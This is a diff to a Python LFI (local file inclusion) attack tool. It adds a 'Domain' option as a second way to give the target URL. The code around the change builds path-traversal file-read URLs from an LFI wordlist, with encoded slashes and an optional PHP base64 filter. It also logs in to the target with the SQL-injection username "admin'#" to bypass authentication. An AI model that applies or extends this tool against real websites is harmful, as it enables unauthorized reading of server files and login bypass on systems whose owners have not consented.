@@ -49,18 +49,21 @@ class Read_File:
                 if self.args.read:
                    print("[+] File Target         : ................ | : ", str(self.args.read))  
                 else:    
-                   print("[+] LFI-wordlist        : ................ | : LFI-wordlist.txt")   
-            print("[+] Vulnrenable url     : ................ | : "+str(self.args.Vulnurl))
+                   print("[+] LFI-wordlist        : ................ | : LFI-wordlist.txt") 
+            if self.args.Domain:
+                 print("[+] Vulnrenable url     : ................ | : "+str(self.args.Domain))
+            else:
+                print("[+] Vulnrenable url     : ................ | : "+str(self.args.Vulnurl))
             if self.args.base64:
                print("[+] PHP-Filter          : ................ | : Convert-base64") 
             print("[+] web Cookies         : ................ | : "+self.Cookie)  
-            if self.args.auth and self.args.Vulnurl\
+            if self.args.auth and (self.args.Vulnurl or self.args.Domain)\
             and self.args.password and self.args.user\
             and self.args.Cookie and self.args.loginurl\
             and self.args.read:
                 self.Login_auth()
                 self.url_request()
-            elif not self.args.auth and self.args.Vulnurl\
+            elif not self.args.auth and (self.args.Vulnurl or self.args.Domain)\
             and not self.args.password and not self.args.user and self.args.Cookie\
             and self.args.read :
                 self.url_request()
@@ -154,7 +157,10 @@ class Read_File:
                         URL = self.args.Vulnurl+ phpfillter
 
                     else:
-                         URL = self.args.Vulnurl 
+                         if self.args.Domain:
+                            URL = self.args.Domain
+                         else:
+                             URL = self.args.Vulnurl 
                     if '//' in LINE and not 'file' in LINE:  
                         self.LFI =URL+LINE+self.args.read.replace('/','//')
                     elif '%2f' in LINE  :
@@ -173,8 +179,11 @@ class Read_File:
                                  ('Cookie',str(self.Cookie).replace('\n','')),
                                  ('username',"admin'#"),
                                  ('password','password')]
-                    try:             
-                       first_req = request.open(self.args.Vulnurl).read()                                                      
+                    try: 
+                       if self.args.Domain:
+                           first_req = request.open(self.args.Domain).read()
+                       else:           
+                           first_req = request.open(self.args.Vulnurl).read()                                                      
                        self.Get_Oregnal_URL = request.open(self.url).read() 
                     except Exception  as e :
                          print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
